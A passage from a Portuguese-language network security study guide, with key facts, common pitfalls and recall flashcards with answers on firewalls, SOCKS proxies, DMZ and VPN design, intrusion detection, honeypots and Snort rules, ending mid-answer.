1024 / &gt; 1024 (exemplo 49152)</td></tr><tr><td>Tipos de firewall</td><td>4: filtro de pacotes, com estado, proxy de aplicação, de circuito</td></tr><tr><td>SOCKS</td><td>versão 5, RFC 1928, porta TCP 1080</td></tr><tr><td>Tamanho do software do host bastião</td><td>aplicação de correio 20.000+ linhas, proxy menos de 1.000</td></tr><tr><td>Portas de dados FTP do firewall pessoal</td><td>1024 a 65535 depois de uma conexão a partir de 20 ou 21</td></tr><tr><td>Implementações de firewall pessoal</td><td>netfilter (Linux), pf (BSD, macOS), Windows Firewall</td></tr><tr><td>Propósitos do firewall interno</td><td>3: filtragem mais estrita, DMZ nos dois sentidos, segmentação</td></tr><tr><td>Classes de intruso</td><td>4: criminosos cibernéticos, ativistas, APTs, outros</td></tr><tr><td>Passos da metodologia de ataque</td><td>6: alvo, acesso, escalar, explorar, manter, apagar rastros</td></tr><tr><td>Componentes lógicos do IDS</td><td>3: sensores, analisadores, interface de usuário</td></tr><tr><td>Motivações / requisitos do IDS</td><td>3 / 9</td></tr><tr><td>Fases / categorias da detecção de anomalia</td><td>2 (treinamento, detecção) / 3 (estatística, conhecimento, ML)</td></tr><tr><td>Abordagens de aprendizado de máquina</td><td>6: bayesiana, Markov, neural, fuzzy, genética, agrupamento</td></tr><tr><td>Fontes de dados do HIDS</td><td>4: chamadas de sistema, auditoria, somas de arquivos, Registro</td></tr><tr><td>Modos de sensor do NIDS</td><td>2: em linha (IPS), passivo (derivação, NIC sem IP)</td></tr><tr><td>Objetivos / posições do honeypot</td><td>3 / 3 (externo, DMZ, interno)</td></tr><tr><td>Regra do Snort: portas excluídas</td><td>7680 e 1521</td></tr><tr><td>Regra do Snort: content / depth</td><td>00 00 00 0d 06 00 / 6 bytes</td></tr><tr><td>Regra do Snort: threshold</td><td>1 alerta por destino a cada 300 segundos</td></tr><tr><td>Regra do Snort: sid / rev</td><td>2000334 / 14</td></tr><tr><td>Falhas de código do OWASP Top 10 no slide</td><td>5</td></tr><tr><td>Categorias do CWE/SANS Top 25</td><td>3: interação insegura, recursos arriscados, defesas porosas</td></tr><tr><td>Buffers fixos típicos</td><td>512 ou 1024 bytes; o exemplo usa 10 bytes</td></tr><tr><td>Heartbleed</td><td>OpenSSL, 2014, leitura excessiva de buffer</td></tr><tr><td>Fuzzing</td><td>Barton Miller, 1989</td></tr><tr><td>Compilador malicioso</td><td>Ken Thompson, 1984</td></tr><tr><td>Morris Worm</td><td>comando DEBUG do sendmail</td></tr><tr><td>Exemplo de canonicalização</td><td>&quot;/&quot; é 2F; falha do IIS nos anos 1990</td></tr><tr><td>Áreas críticas de interação</td><td>4: entrada, algoritmo, outros componentes, saída</td></tr><tr><td>Norma citada</td><td>ISO 12207 ciclo de vida de software</td></tr></tbody></table></div><h3 id="armadilhas" tabindex="-1"><span class="cut mono-3 wght-2 slnt-2 step-1">A</span><span class="cut mono-3 wght-4 slnt-2 step-3">r</span><span class="cut mono-5 wght-2 slnt-1 step-0">m</span><span class="cut mono-3 wght-0 slnt-0 step-2">a</span><span class="cut mono-5 wght-5 slnt-3 step-2">d</span><span class="cut mono-4 wght-4 slnt-2 step-3">i</span><span class="cut mono-2 wght-4 slnt-2 step-3">l</span><span class="cut mono-4 wght-2 slnt-1 step-2">h</span><span class="cut mono-0 wght-3 slnt-2 step-3">a</span><span class="cut mono-5 wght-5 slnt-3 step-1">s</span> <a class="header-anchor" href="#armadilhas" aria-hidden="true">#</a></h3><ol><li><strong>Um filtro positivo termina com deny, um filtro negativo termina com allow.</strong> Não o contrário.</li><li><strong>O firewall com estado ainda lê os mesmos cabeçalhos que o filtro de pacotes.</strong> Ele acrescenta o estado da conexão, não substitui as regras.</li><li><strong>O proxy de circuito não examina a carga útil.</strong> Só o proxy de aplicação examina.</li><li><strong>SOCKS não é um gateway de camada de rede.</strong> É uma camada intermediária entre aplicação e transporte, e não encaminha ICMP.</li><li><strong>A regra 4 refinada precisa tanto da porta de origem 25 quanto do flag ACK.</strong> A porta de origem sozinha é derrotada por um atacante que roda um serviço na porta 25.</li><li><strong>O ataque de fragmento minúsculo não é sobre limites de tamanho.</strong> Ele separa o cabeçalho TCP do primeiro fragmento, pelo qual o filtro decide.</li><li><strong>IPsec atrás do firewall cega o firewall.</strong> IPsec no roteador de borda é menos seguro. A resposta é IPsec no firewall.</li><li><strong>O firewall interno protege nos dois sentidos.</strong> A DMZ também é protegida da rede interna.</li><li><strong>Um IDS detecta e alerta; um IPS bloqueia.</strong> O IPS precisa de um sensor em linha.</li><li><strong>A detecção por assinatura não vê ataques de dia zero.</strong> A detecção de anomalia pode, ao preço de mais falsos alarmes.</li><li><strong>Internos são o caso mais difícil (Anderson).</strong> A busca de anomalias sozinha é insuficiente para eles.</li><li><strong>A falácia da taxa-base:</strong> intrusões são raras, então mesmo um bom IDS produz muitos falsos alarmes. Alta detecção e poucos falsos alarmes são extremamente difíceis juntos.</li><li><strong>O NIDS perde em tráfego cifrado.</strong> É parte da solução, não a solução.</li><li><strong>Rastros de chamadas de sistema são a fonte preferida do HIDS em Unix, e problemáticos no Windows</strong> por causa das DLLs.</li><li><strong>Antivírus é HIDS por assinatura.</strong> É muito eficiente em malware conhecido e inútil em dia zero.</li><li><strong>Um honeypot que inicia tráfego de saída foi comprometido.</strong> Qualquer tráfego de entrada para ele é suspeito.</li><li><strong>Baixa interação emula; alta interação é um sistema real</strong> e o maior risco jurídico.</li><li><strong>A regra do Snort é detecção por assinatura</strong>, sem linha de base e sem treinamento.</li><li><strong>Heartbleed é uma leitura excessiva de buffer, não um estouro.</strong> O código leu mais do que recebeu.</li><li><strong>&quot;stack smashing detected&quot; é a proteção do GCC, não o ataque.</strong> O ataque precisa de <code>-fno-stack-protector</code> para reproduzir.</li><li><strong>XSS mira o próximo usuário, não o servidor.</strong> É uma falha de tratamento de entrada e de saída.</li><li><strong>Lista branca, não lista negra.</strong> Listas negras falham a cada nova evasão.</li><li><strong>Canonicalizar antes de validar.</strong> Senão uma codificação alternativa de &quot;/&quot; passa pelo filtro.</li><li><strong>Conversões de sem sinal para com sinal invertem verificações de tamanho.</strong> Um valor enorme vira negativo e passa.</li><li><strong>Variáveis de ambiente são entrada.</strong> PATH e LD_LIBRARY_PATH atacam scripts privilegiados.</li></ol><hr><h2 id="_7-baralhos-de-recordacao" tabindex="-1"><span class="cut mono-4 wght-2 slnt-4 step-3">7</span><span class="cut mono-4 wght-5 slnt-3 step-3">.</span> <span class="cut mono-2 wght-4 slnt-3 step-3">B</span><span class="cut mono-5 wght-2 slnt-2 step-1">a</span><span class="cut mono-0 wght-3 slnt-4 step-1">r</span><span class="cut mono-3 wght-0 slnt-5 step-2">a</span><span class="cut mono-3 wght-1 slnt-0 step-3">l</span><span class="cut mono-1 wght-4 slnt-5 step-2">h</span><span class="cut mono-0 wght-1 slnt-0 step-2">o</span><span class="cut mono-0 wght-0 slnt-1 step-1">s</span> <span class="cut mono-3 wght-0 slnt-3 step-1">d</span><span class="cut mono-2 wght-1 slnt-5 step-3">e</span> <span class="cut mono-0 wght-2 slnt-2 step-1">r</span><span class="cut mono-5 wght-4 slnt-1 step-1">e</span><span class="cut mono-1 wght-5 slnt-3 step-0">c</span><span class="cut mono-5 wght-3 slnt-1 step-0">o</span><span class="cut mono-5 wght-1 slnt-2 step-1">r</span><span class="cut mono-3 wght-0 slnt-0 step-1">d</span><span class="cut mono-0 wght-4 slnt-3 step-2">a</span><span class="cut mono-1 wght-2 slnt-1 step-2">ç</span><span class="cut mono-0 wght-1 slnt-1 step-2">ã</span><span class="cut mono-4 wght-5 slnt-4 step-1">o</span> <a class="header-anchor" href="#_7-baralhos-de-recordacao" aria-hidden="true">#</a></h2><p>Perguntas primeiro, respostas abaixo. Cada baralho indica a Parte de origem.</p><h3 id="_7-1-baralho-f-firewalls" tabindex="-1"><span class="cut mono-3 wght-0 slnt-4 step-3">7</span><span class="cut mono-2 wght-3 slnt-3 step-3">.</span><span class="cut mono-1 wght-3 slnt-5 step-3">1</span> <span class="cut mono-4 wght-5 slnt-1 step-0">B</span><span class="cut mono-0 wght-0 slnt-3 step-1">a</span><span class="cut mono-4 wght-1 slnt-5 step-1">r</span><span class="cut mono-2 wght-5 slnt-3 step-1">a</span><span class="cut mono-4 wght-1 slnt-2 step-2">l</span><span class="cut mono-4 wght-5 slnt-5 step-2">h</span><span class="cut mono-1 wght-5 slnt-2 step-2">o</span> <span class="cut mono-5 wght-0 slnt-3 step-1">F</span><span class="cut mono-5 wght-1 slnt-5 step-2">:</span> <span class="cut mono-3 wght-2 slnt-0 step-3">f</span><span class="cut mono-5 wght-5 slnt-4 step-1">i</span><span class="cut mono-3 wght-0 slnt-0 step-0">r</span><span class="cut mono-4 wght-1 slnt-5 step-0">e</span><span class="cut mono-2 wght-5 slnt-3 step-2">w</span><span class="cut mono-3 wght-0 slnt-3 step-2">a</span><span class="cut mono-0 wght-5 slnt-4 step-3">l</span><span class="cut mono-0 wght-4 slnt-0 step-2">l</span><span class="cut mono-1 wght-4 slnt-1 step-1">s</span> <a class="header-anchor" href="#_7-1-baralho-f-firewalls" aria-hidden="true">#</a></h3><h4 id="perguntas" tabindex="-1"><span class="cut mono-0 wght-3 slnt-3 step-0">P</span><span class="cut mono-2 wght-4 slnt-2 step-0">e</span><span class="cut mono-5 wght-4 slnt-2 step-3">r</span><span class="cut mono-0 wght-3 slnt-4 step-1">g</span><span class="cut mono-5 wght-4 slnt-5 step-2">u</span><span class="cut mono-2 wght-1 slnt-0 step-3">n</span><span class="cut mono-1 wght-1 slnt-4 step-1">t</span><span class="cut mono-5 wght-2 slnt-3 step-3">a</span><span class="cut mono-2 wght-1 slnt-0 step-2">s</span> <a class="header-anchor" href="#perguntas" aria-hidden="true">#</a></h4><p><strong>F1.</strong> Enuncie o dilema do firewall e os seis estágios da evolução dos sistemas. Por que a segurança por host não basta?</p><p><strong>F2.</strong> Defina o perímetro, o ponto de gargalo e a defesa em profundidade. Enuncie os três objetivos de projeto de [BELL94] e como cada um é alcançado.</p><p><strong>F3.</strong> O que é a política de acesso, de onde ela vem, e por quais quatro características ela pode filtrar (NIST SP 800-41)?</p><p><strong>F4.</strong> Quatro capacidades e quatro limitações de um firewall.</p><p><strong>F5.</strong> Filtro positivo versus negativo, e descarte padrão versus encaminhamento padrão: lemas, segurança, usuários, quem usa cada um.</p><p><strong>F6.</strong> Cinco campos que um filtro de pacotes usa. Três vantagens e cinco fraquezas.</p><p><strong>F7.</strong> Tabela 9.1: as cinco regras SMTP, a falha na regra 4, a exploração, os dois refinamentos, e por que o flag ACK funciona.</p><p><strong>F8.</strong> Falsificação de IP e fragmento minúsculo: mecanismo e contramedida de cada um.</p><p><strong>F9.</strong> O problema da falta de contexto: portas, números, e a solução com estado com sua tabela.</p><p><strong>F10.</strong> Escreva o filtro positivo e o filtro negativo para o servidor web da lista 8. Nomeie as regras implícitas.</p><p><strong>F11.</strong> Proxy de aplicação: mecanismo, quatro propriedades, o exemplo de GET e POST.</p><p><strong>F12.</strong> Proxy de circuito: mecanismo, diferença principal, o uso híbrido. SOCKS: versão, RFC, porta, posição, componentes, os cinco passos TCP, tratamento de UDP.</p><p><strong>F13.</strong> Host bastião: definição e nove características, com os números de linhas.</p><p><strong>F14.</strong> Firewalls de host, de dispositivo de rede, virtuais e pessoais: o que é cada um e suas vantagens. Implementações de firewall pessoal, política padrão, regra do FTP, quatro recursos avançados.</p><p><strong>F15.</strong> DMZ: o que fica onde, o que vive nela, os três propósitos do firewall interno.</p><p><strong>F16.</strong> VPN: problema, solução, protocolo, e as três posições do IPsec com seus problemas.</p><p><strong>F17.</strong> Firewalls distribuídos: componentes, característica principal, vantagens.</p><p><strong>F18.</strong> DROP versus REJECT: o que é enviado de volta, o flag TCP, por que DROP é furtivo.</p><h4 id="respostas" tabindex="-1"><span class="cut mono-0 wght-0 slnt-0 step-2">R</span><span class="cut mono-5 wght-5 slnt-1 step-0">e</span><span class="cut mono-0 wght-3 slnt-3 step-2">s</span><span class="cut mono-3 wght-0 slnt-3 step-2">p</span><span class="cut mono-3 wght-5 slnt-3 step-3">o</span><span class="cut mono-4 wght-1 slnt-2 step-2">s</span><span class="cut mono-4 wght-1 slnt-5 step-0">t</span><span class="cut mono-2 wght-2 slnt-5 step-3">a</span><span class="cut mono-5 wght-2 slnt-1 step-2">s</span> <a class="header-anchor" href="#respostas" aria-hidden="true">#</a></h4><p>Fonte: Parte 1 e seção 4.</p><p><strong>F1.</strong> Proteger os ativos internos e ainda permitir acesso a WANs e à Internet. Estágios: mainframe com terminais; LANs; rede de instalações com várias LANs; rede corporativa sobre uma WAN privada; conectividade com a Internet; nuvem corporativa com servidores virtualizados. Segurança por host: milhares de sistemas com vários SOs precisam cada um de correção quando uma falha aparece; exige gerência de configuração escalável e aplicação agressiva de correções; difícil e às vezes não compensa o custo. O firewall é a alternativa ou o complemento aceito.</p><p><strong>F2.</strong> Perímetro: a muralha entre a rede das instalações e a Internet. Ponto de gargalo: um ponto onde segurança e auditoria são impostas; um sistema ou vários cooperando. Defesa em profundidade: o firewall é uma camada extra que isola os sistemas internos, doutrina militar clássica. Objetivos: todo o tráfego passa pelo firewall, bloqueando fisicamente todo outro caminho; só passa o tráfego autorizado pela política; o firewall é imune a penetração, por um sistema reforçado com SO seguro.</p><p><strong>F3.</strong> A lista dos tipos de tráfego autorizados a passar, por faixas de endereços, protocolos, aplicações, tipos de conteúdo. Desenvolvida a partir da avaliação de risco e da política de segurança da informação: especificação ampla, refinada em elementos de filtro, implementada na topologia. Características: endereço IP e protocolo (filtros de pacotes, com estado); protocolo de aplicação (proxy: spam SMTP, sites HTTP); identidade do usuário (usuários internos, exige IPsec); atividade de rede (hora do dia, taxa de requisições contra varredura, padrões).</p><p><strong>F4.</strong> Capacidades: ponto de gargalo único (mantém usuários não autorizados fora, bloqueia serviços vulneráveis, protege contra falsificação e ataques de roteamento, simplifica a gerência); local de monitoramento (auditorias, alarmes); plataforma para NAT e logs de gerência de rede; plataforma para VPNs IPsec em modo túnel. Limitações: ataques que o contornam (enlace próprio a provedor, enlaces a parceiros); ameaças internas (funcionário descontente, vítima de phishing); LANs sem fio inseguras; dispositivos portáteis infectados (BYOD).</p><p><strong>F5.</strong> O filtro positivo passa só pacotes correspondentes, deny no final. O filtro negativo rejeita pacotes correspondentes, allow no final. Descarte padrão: &quot;não expressamente permitido é proibido&quot;, mais seguro, tudo bloqueado e depois adicionado caso a caso, visível aos usuários como obstáculo, empresas e governo. Encaminhamento padrão: &quot;não expressamente proibido é permitido&quot;, mais fácil para os usuários, segurança reduzida, o administrador reage a cada nova ameaça, organizações abertas como universidades.</p><p><strong>F6.</strong> IP de origem, IP de destino, porta de origem e de destino, campo de protocolo IP (TCP, UDP, ICMP), interface. Vantagens: simplicidade, transparência, velocidade (sem carga útil). Fraquezas: sem dados das camadas superiores (não bloqueia comandos de aplicação); registro limitado; sem autenticação avançada de usuário; vulnerável a ataques na pilha TCP/IP como falsificação; sujeito a erro de configuração por causa das poucas variáveis.</p><p><strong>F7.</strong> Regra 1 entrada, externo para interno, TCP, destino 25, permit. Regra 2 saída, destino &gt; 1023, permit. Regra 3 saída, destino 25, permit. Regra 4 entrada, destino &gt; 1023, permit. Regra 5 ambos, qualquer, deny. Falha: a regra 4 deixa tráfego externo alcançar qualquer porta acima de 1023. Exploração: porta 5150 do atacante para o proxy interno na porta 8080. Refinamento 1: porta de origem 25 nas regras 2 e 4, porta de origem &gt; 1023 nas regras 1 e 3. Buraco restante: um atacante roda um serviço na porta 25 e envia da porta de origem 25. Refinamento 2: a regra 4 exige o flag ACK, porque um pacote de uma conexão estabelecida sempre tem ACK, e um pacote que inicia uma conexão tem SYN sem ACK.</p><p><strong>F8.</strong> Falsificação: pacotes de fora carregam um endereço de origem interno confiável para passar pela segurança baseada em endereço; contramedida: descartar pacotes que chegam na interface externa com endereço de origem interno. Fragmento minúsculo: a fragmentação IP empurra o cabeçalho TCP com as portas para um fragmento posterior, o filtro decide pelo primeiro fragmento e deixa o resto passar; contramedida: exigir uma quantidade mínima do cabeçalho de transporte no primeiro fragmento, e se ele é rejeitado lembrar o ID do pacote e descartar os fragmentos seguintes.</p><p><strong>F9.</strong> O filtro sem estado decide pacote a pacote sem conhecimento das conexões. Servidor: porta bem conhecida fixa abaixo de 1024 (SMTP 25). Cliente: porta temporária acima de 1024 (49152). Para deixar as respostas entrarem, toda porta alta precisa estar aberta na entrada. Com estado: uma tabela de estado das conexões TCP de saída ativas (endereço e porta de origem, endereço e porta de destino, estado, por exemplo 192.168.1.100:1030 para 210.9.88.29:80 estabelecida); tráfego de entrada para uma porta alta é aceito só se corresponde a uma entrada. Também rastreia números de sequência TCP contra sequestro de sessão e faz DPI limitado para FTP, IM, SIPS.</p><p><strong>F10.</strong> Positivo: any:&gt;1023 para 172.16.20.5:80 permit; any:&gt;1023 para 172.16.20.5:443 permit; 10.0.0.100:&gt;1023 para 172.16.20.5:22 permit; deny all implícito. Negativo: 10.0.0.100 para :22 permit (exceção primeiro); any para :22 deny; any para :21 deny; any para :1-79, :81-442, :444-65535 deny; allow all implícito. O filtro negativo precisa de faixas para expressar &quot;outros: não&quot;.</p><p><strong>F11.</strong> Um retransmissor no nível de aplicação: o usuário contata o gateway, dá o host remoto e as credenciais, o gateway abre sua própria conexão com o servidor e retransmite segmentos; duas conexões emendadas, sem fim a fim. Controle granular: sem código de proxy, sem serviço; permitir HTTP GET, negar POST. Mais seguro: umas poucas aplicações em vez de incontáveis combinações de IP, porta, flag. Registro e auditoria fáceis no nível de aplicação. Desvantagem: sobrecarga de processamento nas duas conexões.</p><p><strong>F12.</strong> Duas conexões TCP, host interno ao gateway e gateway ao host externo; uma vez estabelecidas ele retransmite segmentos sem examinar a carga útil; a segurança é só quais conexões são permitidas. Híbrido: usuários internos confiáveis, proxy de aplicação na entrada (caro, seguro), proxy de circuito na saída (barato). SOCKS v5, RFC 1928, servidor na porta TCP 1080; uma camada intermediária entre aplicação e transporte, não um gateway de rede, sem ICMP. Componentes: servidor SOCKS no firewall, biblioteca cliente nos hosts internos, clientes SOCKS-ificados religados. TCP: conectar à 1080, negociar autenticação, autenticar, enviar uma requisição de retransmissão (IP e porta), o servidor avalia e conecta. UDP: uma conexão TCP de controle à 1080 só para autenticar, depois os segmentos UDP são retransmitidos enquanto ela fica aberta.</p><p><strong>F13.</strong> Um sistema identificado pelo administrador como ponto forte crítico; a plataforma para proxies de aplicação e de circuito e serviços como IPsec; um sistema reforçado com SO seguro. Características: só serviços essenciais (proxies para DNS, FTP, HTTP, SMTP); autenticação extra antes dos proxies e por proxy; cada proxy suporta um subconjunto de comandos; cada proxy permite só hosts internos específicos; logs de auditoria detalhados por proxy; software muito pequeno (aplicação de correio 20.000+ linhas, proxy menos de 1.000), mais fácil de auditar; proxies independentes, um pode ser removido, novos serviços adicionados; sem acesso a disco além da configuração inicial, então sistemas de arquivos executáveis podem ser somente leitura contra cavalos de Troia e sniffers; cada proxy roda como usuário sem privilégios em um diretório privado.</p><p><strong>F14.</strong> De host: um módulo de software que protege um host, muitas vezes um servidor; regras ajustadas, proteção independente da topologia, camada extra para que novos servidores não exijam mudança no firewall de rede. De dispositivo de rede: filtragem de pacotes e inspeção com estado em roteadores e switches, camadas extras. Virtual: um host bastião virtualizado como VM, ou funções de firewall no hipervisor. Pessoal: entre um PC e a rede, em casa ou em intranets, como software no PC ou no roteador doméstico; mais simples; nega acesso remoto não autorizado e monitora atividade de saída contra worms; netfilter, pf, Windows Firewall; CLI ou GUI. Padrão: entrada negada exceto o que o usuário permite, saída permitida. FTP: portas 20 e 21 abertas, e depois de uma conexão a partir de 20 ou 21, portas 1024 a 65535 abertas para dados. Avançados: modo furtivo (descarta pacotes não solicitados), bloqueio de UDP, registro, filtro de aplicação (só aplicações selecionadas ou assinadas por CA).</p><p><strong>F15.</strong> Firewall externo na borda depois do roteador de borda; firewall(s) interno(s) protegendo a rede corporativa; a DMZ entre eles com o site web, o servidor SMTP e o servidor DNS. Firewall externo: proteção moderada para a DMZ, básica para o resto. Firewall interno: filtragem mais estrita; proteção nos dois sentidos, a rede interna de um servidor da DMZ comprometido (malware, rootkits, bots) e a DMZ da rede interna; segmentação interna com vários firewalls (servidores versus estações de trabalho).</p><p><strong>F16.</strong> Problema: LANs dispersas precisam interconectar-se; a Internet é mais barata e mais fácil que linhas privadas mas expõe o tráfego a escuta e acesso não autorizado. Solução: uma VPN, computadores interconectados por uma rede insegura com criptografia e autenticação nas camadas inferiores, mesmo sistema nos dois extremos. Protocolo: IPsec; o dispositivo IPsec cifra e comprime todo o tráfego para a WAN e reverte na entrada, de forma transparente; a estação de um usuário remoto pode rodar IPsec mas vira um alvo atraente. Posições: atrás do firewall, o firewall não consegue filtrar, varrer, registrar ou controlar tráfego cifrado; no roteador de borda, menos seguro que o firewall; no próprio firewall, a escolha funcional.</p><p><strong>F17.</strong> Firewalls de rede autônomos mais firewalls de host em servidores e estações de trabalho, sob controle administrativo central; ferramentas deixam o administrador definir políticas e monitorar centenas de firewalls de host e pessoais, locais e remotos. Vantagens: proteção contra ataques internos, proteção ajustada a máquinas e aplicações.</p><p><strong>F18.</strong> DROP descarta em silêncio, nada volta; REJECT descarta e envia um erro, um erro ICMP ou um reset TCP (além dos slides). O flag é RST. Furtivo: com REJECT o atacante recebe um &quot;fechada, host vivo&quot; imediato por sondagem; com DROP cada sondagem espera um timeout e retransmite, a porta aparece como &quot;filtrada&quot;, e o host parece ausente, que é o modo furtivo do slide 500.</p><h3 id="_7-2-baralho-d-ids-ips-honeypots-e-snort" tabindex="-1"><span class="cut mono-4 wght-1 slnt-0 step-1">7</span><span class="cut mono-1 wght-2 slnt-5 step-2">.</span><span class="cut mono-2 wght-4 slnt-5 step-3">2</span> <span class="cut mono-2 wght-3 slnt-1 step-1">B</span><span class="cut mono-4 wght-2 slnt-2 step-0">a</span><span class="cut mono-3 wght-5 slnt-0 step-0">r</span><span class="cut mono-5 wght-0 slnt-3 step-3">a</span><span class="cut mono-5 wght-5 slnt-4 step-3">l</span><span class="cut mono-4 wght-0 slnt-1 step-1">h</span><span class="cut mono-0 wght-1 slnt-0 step-0">o</span> <span class="cut mono-3 wght-5 slnt-2 step-1">D</span><span class="cut mono-5 wght-1 slnt-0 step-2">:</span> <span class="cut mono-2 wght-2 slnt-1 step-1">I</span><span class="cut mono-3 wght-0 slnt-2 step-1">D</span><span class="cut mono-0 wght-3 slnt-2 step-3">S</span><span class="cut mono-1 wght-0 slnt-4 step-0">/</span><span class="cut mono-3 wght-3 slnt-1 step-2">I</span><span class="cut mono-3 wght-5 slnt-5 step-3">P</span><span class="cut mono-3 wght-0 slnt-3 step-0">S</span><span class="cut mono-1 wght-2 slnt-1 step-1">,</span> <span class="cut mono-1 wght-3 slnt-2 step-1">h</span><span class="cut mono-1 wght-4 slnt-3 step-2">o</span><span class="cut mono-1 wght-3 slnt-3 step-1">n</span><span class="cut mono-1 wght-2 slnt-5 step-1">e</span><span class="cut mono-3 wght-5 slnt-4 step-3">y</span><span class="cut mono-3 wght-4 slnt-5 step-3">p</span><span class="cut mono-0 wght-1 slnt-0 step-0">o</span><span class="cut mono-0 wght-0 slnt-1 step-0">t</span><span class="cut mono-0 wght-0 slnt-5 step-2">s</span> <span class="cut mono-4 wght-3 slnt-1 step-1">e</span> <span class="cut mono-5 wght-5 slnt-4 step-3">S</span><span class="cut mono-5 wght-3 slnt-3 step-0">n</span><span class="cut mono-4 wght-3 slnt-4 step-1">o</span><span class="cut mono-2 wght-0 slnt-3 step-0">r</span><span class="cut mono-4 wght-0 slnt-3 step-2">t</span> <a class="header-anchor" href="#_7-2-baralho-d-ids-ips-honeypots-e-snort" aria-hidden="true">#</a></h3><h4 id="perguntas-1" tabindex="-1"><span class="cut mono-0 wght-3 slnt-3 step-0">P</span><span class="cut mono-2 wght-4 slnt-2 step-0">e</span><span class="cut mono-5 wght-4 slnt-2 step-3">r</span><span class="cut mono-0 wght-3 slnt-4 step-1">g</span><span class="cut mono-5 wght-4 slnt-5 step-2">u</span><span class="cut mono-2 wght-1 slnt-0 step-3">n</span><span class="cut mono-1 wght-1 slnt-4 step-1">t</span><span class="cut mono-5 wght-2 slnt-3 step-3">a</span><span class="cut mono-2 wght-1 slnt-0 step-2">s</span> <a class="header-anchor" href="#perguntas-1" aria-hidden="true">#</a></h4><p><strong>D1.</strong> Externos versus internos, e as quatro classes de intruso com motivação e exemplos.</p><p><strong>D2.</strong> Onde IDS/IPS funcionam bem e onde falham? Por quê?</p><p><strong>D3.</strong> A metodologia comum de ataque e seus seis passos, com um exemplo cada.</p><p><strong>D4.</strong> Defina intrusão de segurança, detecção de intrusão, e os três componentes lógicos de um IDS. Classifique pela fonte de dados.</p><p><strong>D5.</strong> Três motivações para um IDS. A suposição fundamental e sua consequência.</p><p><strong>D6.</strong> O compromisso frouxo versus estrito. A visão clássica sobre externos e internos. A falácia da taxa-base.</p><p><strong>D7.</strong> Os nove requisitos de um IDS.</p><p><strong>D8.</strong> Detecção de anomalia: as duas fases e as três categorias, com vantagens e desvantagens de cada uma. Seis abordagens de aprendizado de máquina.</p><p><strong>D9.</strong> Detecção por assinatura versus heurística: como, onde usada, vantagens, desvantagens, a fonte das regras, o sistema de exemplo.</p><p><strong>D10.</strong> Assinatura versus anomalia em dia zero, falsos positivos, custo, adaptabilidade.</p><p><strong>D11.</strong> HIDS: definição, propósitos, quatro fontes de dados com vantagem e desvantagem.</p><p><strong>D12.</strong> HIDS de anomalia em Linux: por que chamadas de sistema, STIDE, os quatro motores de ML. HIDS por assinatura: do que é a base, duas técnicas, limite.</p><p><strong>D13.</strong> NIDS: definição, camadas, contraste com HIDS, arquitetura, a limitação da criptografia.</p><p><strong>D14.</strong> Sensor em linha versus passivo. A configuração passiva com a derivação e duas NICs. Sensores sem fio e WIDS.</p><p><strong>D15.</strong> Honeypots: definição, três objetivos, a lógica, a regra do valor, baixa versus alta interação com compromissos, honeynet.</p><p><strong>D16.</strong> As três posições do honeypot com vantagens e desvantagens. Honeyfiles.</p><p><strong>D17.</strong> Escreva o cabeçalho da regra do Snort e explique cada parte. Explique msg, flow, content, depth, threshold, reference, classtype, sid, rev.</p><p><strong>D18.</strong> O pipeline do Snort do pacote ao alerta. Qual abordagem é a regra do BitTorrent?</p><p><strong>D19.</strong> IDS versus IPS em termos de ação. Por que um filtro de pacotes é insuficiente para detecção?</p><p><strong>D20.</strong> HIDS ou NIDS para: chamadas de sistema anômalas, varredura de portas, exploit em servidor web, acesso a arquivos sensíveis. Onde combiná-los ajuda mais?</p><h4 id="respostas-1" tabindex="-1"><span class="cut mono-0 wght-0 slnt-0 step-2">R</span><span class="cut mono-5 wght-5 slnt-1 step-0">e</span><span class="cut mono-0 wght-3 slnt-3 step-2">s</span><span class="cut mono-3 wght-0 slnt-3 step-2">p</span><span class="cut mono-3 wght-5 slnt-3 step-3">o</span><span class="cut mono-4 wght-1 slnt-2 step-2">s</span><span class="cut mono-4 wght-1 slnt-5 step-0">t</span><span class="cut mono-2 wght-2 slnt-5 step-3">a</span><span class="cut mono-5 wght-2 slnt-1 step-2">s</span> <a class="header-anchor" href="#respostas-1" aria-hidden="true">#</a></h4><p>Fonte: Parte 2 e seção 5.</p><p><strong>D1.</strong> A maioria das violações por externos, algumas por internos, internos podem ser muito mais perigosos; ataques direcionados contornam as defesas de perímetro, daí defesa em profundidade. Criminosos cibernéticos: recompensa financeira, roubo de identidade e credenciais, espionagem, roubo ou resgate de dados, fóruns clandestinos (DarkMarket). Ativistas: causas sociais ou políticas, muitas vezes baixa habilidade, pichação, DoS, vazamentos; Anonymous, LulzSec, Manning, Snowden. APTs: espionagem ou sabotagem patrocinada por estados, sigilosos e persistentes; China, Rússia, EUA, Reino Unido. Outros: hackers clássicos por desafio e reputação (descobriram o estouro de buffer), hackers amadores com kits, recrutáveis.</p><p><strong>D2.</strong> Razoavelmente eficazes contra ataques conhecidos, menos sofisticados: grupos ativistas, golpes de e-mail em larga escala. Menos eficazes contra ataques direcionados sofisticados de criminosos cibernéticos e APTs, porque usam exploits de dia zero e escondem sua atividade. Daí parte da defesa em profundidade com criptografia, trilhas de auditoria, autenticação forte, gerência ativa.</p><p><strong>D3.</strong> Phishing, instalação de malware, roubo de credenciais, comprometimento. Aquisição do alvo e coleta de informação: OSINT, DNS e WHOIS, NMAP, e-mail de sondagem, CMS vulnerável. Acesso inicial: força bruta na senha do CMS, exploit de plugin, spear-phishing com exploit de navegador. Escalação de privilégio: exploits locais até root, sniffers para senhas de admin. Coleta de informação ou exploração: varrer arquivos por dados financeiros e PII, exfiltrar documentos, movimentação lateral com senhas capturadas. Manutenção do acesso: backdoor de RAT ou rootkit, guardar a senha de admin, desabilitar antivírus ou IDS. Apagar rastros: o rootkit esconde arquivos, editar logs.</p><p><strong>D4.</strong> Intrusão: um ato não autorizado de contornar os mecanismos de segurança de um sistema. Detecção de intrusão: uma função de hardware ou software que coleta e analisa informação de várias áreas de um computador ou rede para identificar possíveis intrusões. Componentes: sensores (coletam pacotes, logs, chamadas de sistema e encaminham), analisadores (decidem, com evidências e orientação; dados podem ser armazenados), interface de usuário (ver e controlar). Arquitetura: simples (um sensor, um analisador) ou distribuída (muitos sensores, analisador central). Classes: HIDS (um host: PIDs, chamadas de sistema), NIDS (tráfego de segmentos), distribuído ou híbrido (combina os dois, melhor identificação e resposta).</p><p><strong>D5.</strong> Detecção rápida (expulsar o intruso antes do dano; mais cedo significa menos dano, recuperação mais rápida), efeito dissuasório, coleta de informação para fortalecer a prevenção (regras de firewall, correções). Suposição: o comportamento do intruso difere do comportamento legítimo de formas quantificáveis. Não existe distinção nítida, então há sobreposição e portanto falsos positivos e negativos; o 